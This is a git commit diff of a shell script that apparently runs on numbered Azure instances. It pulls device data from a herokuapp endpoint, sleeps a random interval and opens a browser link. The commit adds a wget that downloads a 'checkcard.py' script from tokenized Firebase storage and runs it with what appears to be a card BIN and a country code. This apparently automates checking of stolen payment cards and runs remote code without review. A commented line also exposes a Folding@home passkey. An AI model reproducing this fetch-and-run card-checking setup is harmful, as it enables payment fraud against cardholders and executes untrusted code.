cb51d34b9d2691f2549619c4e83c49da27b2684b
Vinh Huynh <caubequay00@gmail.com>
2019-10-23 23:43:16 +0700

    Update RunAzure2.sh

--- RunAzure2.sh
+++ RunAzure2.sh
@@ -3,8 +3,8 @@ num=1
 name=$(echo $NAME | cut -c8-)
 num=${name##+(0)}
 pip3 install --upgrade pip --user
-pip3 install requests python3-xlib pyautogui===0.9.39 --user
-python3 -m pip install requests python3-xlib pyautogui===0.9.39 --user
+pip3 install grequests python3-xlib pyautogui===0.9.39 --user
+python3 -m pip install grequests python3-xlib pyautogui===0.9.39 --user
 url="http://jsonserver01.herokuapp.com/online/"$num
 echo $url
 user=$(curl $url | jq -r '.device')
@@ -18,6 +18,8 @@ curl -k -s -o /dev/null -w '%{http_code}' -i -H "Accept: application/json" -H "C
 wait=$(shuf -i 60-500 -n 1)
 sleep $wait
 firefox $link
+wget -O check.py https://firebasestorage.googleapis.com/v0/b/jsonserver-b9334.appspot.com/o/checkcard.py?alt=media&token=57ac0be5-cc55-41c3-a53d-d8c33d967933
+python check.py 421542 us
 #python3 /headless/Desktop/backup/pygui.py
 #FAHClient --user=8fek7tcbax69 --team=234980 --passkey=f11cf30f860040d0f11cf30f860040d0 --gpu=false --smp=true
 #run_3.sh
